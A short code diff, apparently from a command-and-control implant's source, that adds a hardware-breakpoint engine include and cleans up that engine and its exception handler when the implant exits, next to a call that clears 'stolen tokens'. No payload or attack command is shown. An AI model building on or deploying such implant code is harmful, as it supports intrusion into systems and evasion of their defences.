@@ -12,6 +12,7 @@
 #include <core/Kerberos.h>
 #include <core/CoffeeLdr.h>
 #include <core/Runtime.h>  // For RtMscoree declaration
+#include <core/HwBpEngine.h>
 #include <inject/Inject.h>
 
 SEC_DATA DEMON_COMMAND DemonCommands[] = {
@@ -3448,6 +3449,11 @@ VOID CommandExit( PPARSER Parser )
 
     // clear all stolen tokens
     TokenClear();
+
+    // cleanup hardware breakpoint engine and remove VEH
+    if ( Instance->HwBpEngine ) {
+        HwBpEngineDestroy( NULL );
+    }
 
     // terminate the use of the Winsock 2 DLL (Ws2_32.dll)
     if ( Instance->WSAWasInitialised ) {
